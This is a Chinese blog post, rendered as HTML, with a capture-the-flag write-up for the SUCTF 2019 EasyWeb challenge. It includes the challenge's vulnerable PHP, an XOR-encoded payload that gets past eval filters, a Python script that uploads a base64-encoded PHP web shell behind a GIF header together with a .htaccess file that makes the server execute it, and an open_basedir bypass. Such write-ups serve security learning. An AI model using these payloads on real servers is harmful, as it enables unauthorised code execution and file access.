@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>[SUCTF 2019]EasyWeb ~ Hexo</title>
+
+  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"  >
+<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css"  >
+<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css"  >
+<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css"  >
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css"  >
+
+<link rel="stylesheet" href="/css/main.css"  >
+
+
+  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css"  >
+
+
+<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>小叹的博客</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">Categories</a>
+          </li>
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background"
+         style="background: url('/img/动漫4.jpg')no-repeat center center;
+           background-size: cover;
+           background-attachment: fixed;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <br>
+              
+                <p class="mt-3">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
+                  Sunday, April 19th 2020, 3:37 pm
+                </p>
+              
+
+              <p>
+                
+                  
+                  &nbsp;<i class="far fa-chart-bar"></i>
+                  <span class="post-count">
+                    1.7k 字
+                  </span>&nbsp;
+                
+
+                
+                  
+                  &nbsp;<i class="far fa-clock"></i>
+                  <span class="post-count">
+                      7 分钟
+                  </span>&nbsp;
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
+                  <span id="busuanzi_container_page_pv">
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>&nbsp;
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="py-5 z-depth-3" id="board">
+        <div class="post-content mx-auto" id="post">
+          <div class="markdown-body">
+            <h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><p><a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/easyweb" target="_blank" rel="noopener">题目源码</a></p>
+<pre><code class="php">&lt;?php
+function get_the_flag(){
+    // webadmin will remove your upload file every 20 min!!!! 
+    $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);
+    if(!file_exists($userdir)){
+    mkdir($userdir);
+    }
+    if(!empty($_FILES[&quot;file&quot;])){
+        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];
+        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];
+        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);
+    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); 
+        if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!==False) die(&quot;^_^&quot;);
+    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); 
+        $path= $userdir.&quot;/&quot;.$name;
+        @move_uploaded_file($tmp_name, $path);
+        print_r($path);
+    }
+}
+
+$hhh = @$_GET[&#39;_&#39;];
+
+if (!$hhh){
+    highlight_file(__FILE__);
+}
+
+if(strlen($hhh)&gt;18){
+    die(&#39;One inch long, one inch strong!&#39;);
+}
+
+if ( preg_match(&#39;/[\x00- 0-9A-Za-z\&#39;&quot;\`~_&amp;.,|=[\x7F]+/i&#39;, $hhh) )
+    die(&#39;Try something else!&#39;);
+
+$character_type = count_chars($hhh, 3);
+if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);
+
+eval($hhh);
+?&gt;</code></pre>
+<p>这道题的第一个部分就是bypass这一道道的<code>if</code>语句，要满足所有条件需要</p>
+<ul>
+<li>$hhh的总长度超过18</li>
+<li>需要绕过正则</li>
+<li>需要满足字符串里面出现的字符种类数小于12</li>
+</ul>
+<p>长度的话我们可以构造一个<code>$_GET</code>的变量，然后再取给这个<code>$_GET</code>变量来传递参数就可以了。先用php脚本来看看还剩下哪些字符能够使用</p>
+<pre><code class="php">&lt;?php
+
+$ascii=0;
+for(;$ascii&lt;256;){
+    if(!preg_match(&#39;/[\x00- 0-9A-Za-z\&#39;&quot;\`~_&amp;.,|=[\x7F]+/i&#39;, chr($ascii))){
+        echo chr($ascii).&quot;:&quot;.$ascii.&quot;\n&quot;;
+    }
+    $ascii++;
+}
+    echo &quot;\n&quot;;
+ ?&gt;</code></pre>
+<p>这里面存在了<code>$</code>、<code>%</code>、<code>^</code>这样我们就可以利用字符之间的异或，来构造任意字符来满足我们想要的<code>$_GET</code>变量。</p>
+<pre><code class="php">import string
+
+guess = string.printable
+_ = []
+G = []
+E = []
+T = []
+
+for i in range(256):
+    for j in range(256):
+        if ((chr(i) not in guess) &amp; (chr(j) not in guess)):
+            res = i ^ j
+            if (chr(res) == &#39;_&#39;):
+                result = []
+                result.append(str(hex(i)[2:])+&quot;^&quot;+str(hex(j)[2:]))
+                _.append(result)
+            if (chr(res) == &#39;G&#39;):
+                result = []
+                result.append(str(hex(i)[2:])+&quot;^&quot;+str(hex(j)[2:]))
+                G.append(result)
+            if (chr(res) == &#39;E&#39;):
+                result = []
+                result.append(str(hex(i)[2:])+&quot;^&quot;+str(hex(j)[2:]))
+                E.append(result)
+            if (chr(res) == &#39;T&#39;):
+                result = []
+                result.append(str(hex(i)[2:])+&quot;^&quot;+str(hex(j)[2:]))
+                T.append(result)
+
+print(_,end=&quot;\n&quot;)
+print(G,end=&quot;\n&quot;)
+print(E,end=&quot;\n&quot;)
+print(T,end=&quot;\n&quot;)</code></pre>
+<blockquote>
+<p><strong>我们构造的Payload究竟是怎么样的?</strong></p>
+<p><strong>现在已经知道了 Payload 需要由那些不可见字符组成</strong> , 那么 Payload 究竟是怎样的呢?</p>
+<p>题目中有这么一条限制 : <strong>GET方法获取参数的值不能超过 18 个 字符</strong> , 如果想要在 Payload 中执行一个函数 , 格式肯定 <strong>(xxx^xxx)();</strong> 这样的 . 这还必须是无参函数 .</p>
+<p><strong>但即使是无参函数 , 已经使用的字符( 小括号 , 异或符号 , … ) 也已经使用了6个字符 , 函数名又需要两两字符异或计算得到 , 也就是函数名最多有 ((18 - 6) / 2 = 6)个字符 , 而6个字符连个 phpinfo 都运行不了</strong> , 这样肯定是不可行的 .</p>
+<p>直接调用函数好像是不可行的 , 我们需要换一种思路 —— <strong>比如使用全局变量 , 至少” $ “ 符号还是可以使用的</strong> , 介于<strong>题目中对 Payload 长度有限制</strong> , 最短的全局变量为 : <strong>$_GET</strong> . “ <code>$</code> “本身可用 , 而 <strong>_GET</strong> 的形式大概是 : <strong>{xxxx^xxxx}</strong> 这样的 .</p>
+<p>有了全局变量 , 就可以利用 <strong>${} 中的代码是可以执行的特点</strong> ， 把要运行的函数名作为参数来动态执行 . 也就是<code>${x}();</code>这样的形式 , <strong>函数名的值 “ x “ 可以通过全局方法GET来获取</strong></p>
+<p>因此 , 完整的 Payload 应该为 : <strong>Payload : ${xxxx^xxxx}{x}();&amp;x= …</strong> , 转换后就变成了 <strong>$_GET<a href="http://github.mrkaixin.computer/2019/06/05/BUUCTF做题笔记/" target="_blank" rel="noopener">x</a>;&amp;x= …</strong></p>
+<p>并且 , <strong>“ _ “ 参数的值为 : ${xxxx^xxxx}(x)(); , 长度为 18 个字符 , 恰好满足题目 strlen() 函数的限制</strong></p>
+<p>该函数限制” _ “参数值最多只能使用<strong>12</strong>个不同的字符 , 而现在 <code>${xxxx^xxxx}{x}();</code> 在不考虑 “ x “ 的情况下已经使用了 <strong>7</strong> 个字符了 , <strong>因此 x 最多只能使用 5 个不同的字符</strong></p>
+<p>根据这个思路 , 可以在合理的情况下构造 Payload 了 , 这里以执行 phpinfo() 为例 , 构造 Payload 如下</p>
+</blockquote>
+<p>这个师傅写的特别的详细，点赞！</p>
+<p>所以最后的payload:</p>
+<pre><code class="php">_=${%81%81%81%81^%de%c6%c4%d5}{%81}();&amp;%81=phpinfo</code></pre>
+<p><a href="https://i.loli.net/2019/10/09/qSmRZN6VHxsU1eC.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/qSmRZN6VHxsU1eC.png" srcset="/img/loading.gif" alt="执行payload">执行payload</a></p>
+<p>然后就是第二关了，我们可以看到源码里有一个<code>get_the_flag</code>函数，我们需要利用这个函数来上传一个shell，这个文件需要满足的要求是</p>
+<ul>
+<li>文件扩展名中不能出现<code>ph</code></li>
+<li>并且文件中不能出现`</li>
+<li>最后通过 exif_imagetype() 函数对文件类型进行检查 , 如果文件不是一张图片 , 则不通过检测 .</li>
+</ul>
+<p>不能出现<code>ph</code>的后缀文件，所以我们就不能直接上传<code>php</code>文件。</p>
+<p>再一个我们从前面的phpinfo中得知题目的php的版本为php7，凑巧的是php7已经删除了<code></code>这种语法了，我们只能利用另外的骚操作</p>
+<p>我的做法是，先上传一个文件，要求如下</p>
+<ul>
+<li>有文件头，可以被<code>exif_imagetype()</code>识别出是一个图片</li>
+<li>里面有base64加密的代码</li>
+</ul>
+<pre><code class="php">shell = b&quot;\x00\x00\x47\x49\x46\x38\x39\x61&quot;+b&quot;00&quot;+base64.b64encode(b&#39;&lt;?php @eval($_POST[&quot;mrkaixin&quot;]);?&gt;&#39;)</code></pre>
+<p>这里面的<code>\x00\x00\x47\x49\x46\x38\x39\x61</code>-&gt;<code>GIF89a</code>是GIF头，<code>b&quot;00&quot;</code>的作用：用来分割头和php代码。目的是防止之后解密base64解密的时候造成错误。</p>
+<p><a href="https://i.loli.net/2019/10/09/5NqW4xIXYHSfM9y.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/5NqW4xIXYHSfM9y.png" srcset="/img/loading.gif" alt="shell源码">shell源码</a></p>
+<p><a href="https://i.loli.net/2019/10/09/5EF9zRKcbTMSshw.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/5EF9zRKcbTMSshw.png" srcset="/img/loading.gif" alt="base64解密">base64解密</a></p>
+<p>但是单单上传一个这个文件是不行的，所以我们需要<code>.htaccess</code>文件来帮助我们让服务器把这个文件解析成php代码，我们才能够真真的利用。</p>
+<pre><code class="python">htaccess = b&quot;&quot;&quot;\x00\x00\x47\x49\x46\x38\x39\x61
+AddType application/x-httpd-php .aaa
+php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_f4e7685fe689f675c85caeefaedcf40c/shell.aaa&quot;
+&quot;&quot;&quot;</code></pre>
+<p>这个后面的路径是上传完第一个shell文件之后产生的。</p>
+<p>贴一下最后的代码</p>
+<pre><code class="python">import requests
+import base64
+
+#题目链接
+url = &quot;http://73706c84-1992-4dba-adbd-b4f109b5b953.node2.buuoj.cn.wetolink.com:82/&quot;
+
+payload = &quot;?_=${%81%81%81%81^%de%c6%c4%d5}{%81}();&amp;%81=get_the_flag&quot;
+
+shell = b&quot;\x00\x00\x47\x49\x46\x38\x39\x61&quot;+b&quot;00&quot;+base64.b64encode(b&#39;&lt;?php @eval($_POST[&quot;mrkaixin&quot;]);?&gt;&#39;)
+
+htaccess = b&quot;&quot;&quot;\x00\x00\x47\x49\x46\x38\x39\x61
+AddType application/x-httpd-php .aaa
+php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_f4e7685fe689f675c85caeefaedcf40c/shell.aaa&quot;
+&quot;&quot;&quot;
+
+#先上传shell文件,在改路径上传.htaccess文件
+files = {&#39;file&#39;: (&#39;shell.aaa&#39;, shell, &#39;image/gif&#39;)}
+# files = {&#39;file&#39;: (&#39;.htaccess&#39;, htaccess, &#39;image/gif&#39;)}
+
+
+r = requests.post(url + payload, files=files)
+print(r.text)</code></pre>
+<p><a href="https://i.loli.net/2019/10/09/XhpFZIMvJwCByEt.gif" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/XhpFZIMvJwCByEt.gif" srcset="/img/loading.gif" alt="操作过程">操作过程</a></p>
+<p>但是有了shell，会发现可以读到当前目录下的文件，但是无法读到根目录下面的flag。</p>
+<p>因为这里还需要绕过<code>open_basedir</code>这里直接给payload了，可以跟着这个<a href="https://www.jianshu.com/p/fbfeeb43ace2" target="_blank" rel="noopener">师傅的教程</a>动手做一下实验</p>
+<pre><code>chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);print_r(scandir(&#39;/&#39;));</code></pre><p><a href="https://i.loli.net/2019/10/09/PgMK9ejmlZhbtdc.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/PgMK9ejmlZhbtdc.png" srcset="/img/loading.gif" alt="读根目录文件">读根目录文件</a></p>
+<p><a href="https://i.loli.net/2019/10/09/SEavIpjslO7dC1Z.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/SEavIpjslO7dC1Z.png" srcset="/img/loading.gif" alt="利用file_get_contents读取文件">利用file_get_contents读取文件</a></p>
+
+            <hr>
+          </div>
+          <br>
+          <div>
+            <p>
+            
+            
+            </p>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="d-none d-lg-block col-lg-2 toc-container">
+      
+  <div id="toc">
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+    <div id="tocbot"></div>
+  </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+  <div class="container comments mx-auto" id="comments">
+    
+      <br><br>
+      
+      
+
+    
+  </div>
+</div>
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    <br>
+
+    
+  
+    <!-- 不蒜子统计PV -->
+    
+    &nbsp;<span id="busuanzi_container_site_pv">总访问量 
+          <span id="busuanzi_value_site_pv"></span> 次</span>&nbsp;
+  
+  
+    <!-- 不蒜子统计UV -->
+    
+    &nbsp;<span id="busuanzi_container_site_uv">总访客数 
+            <span id="busuanzi_value_site_uv"></span> 人</span>&nbsp;
+  
+  <br>
+
+
+
+    
+
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="/lib/jquery/jquery.min.js" ></script>
+<script src="/lib/popper/popper.min.js" ></script>
+<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
+<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
+<script src="/js/main.js" ></script>
+
+
+  <script src="/js/lazyload.js" ></script>
+
+
+
+  
+    <script src="/lib/tocbot/tocbot.min.js" ></script>
+  
+  <script src="/js/post.js" ></script>
+
+
+
+  <script src="/lib/smooth-scroll/smooth-scroll.min.js" ></script>
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+<!-- Plugins -->
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+  <script src="/lib/prettify/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="/lib/typed/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "[SUCTF 2019]EasyWeb&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="/lib/anchor/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "false",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+  
+  
+    <script type="text/javascript">
+      //定义获取词语下标
+      var a_idx = 0;
+      jQuery(document).ready(function ($) {
+        //点击body时触发事件
+        $("body").click(function (e) {
+          //需要显示的词语
+          var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
+          //设置词语给span标签
+          var $i = $("<span/>").text(a[a_idx]);
+          //下标等于原来下标+1  余 词语总数
+          a_idx = (a_idx + 1) % a.length;
+          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
+          //获取x和y的指针坐标
+          var x = e.pageX, y = e.pageY;
+          //在鼠标的指针的位置给$i定义的span标签添加css样式
+          $i.css({
+            "z-index": 999,
+            "top": y - 20,
+            "left": x,
+            "position": "absolute",
+            "font-weight": "bold",
+            "color": rand_color()
+          });
+          // 随机颜色
+          function rand_color() {
+            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
+          }
+          //在body添加这个标签
+          $("body").append($i);
+          //animate() 方法执行 CSS 属性集的自定义动画。
+          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
+          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
+          $i.animate({
+            //将原来的位置向上移动180
+            "top": y - 180,
+            "opacity": 0
+            //1500动画的速度
+          }, 1500, function () {
+            //时间到了自动删除
+            $i.remove();
+          });
+        });
+      })
+      ;
+    </script>
+  
+
+
+
+
+
+
+
+</body>
+</html>
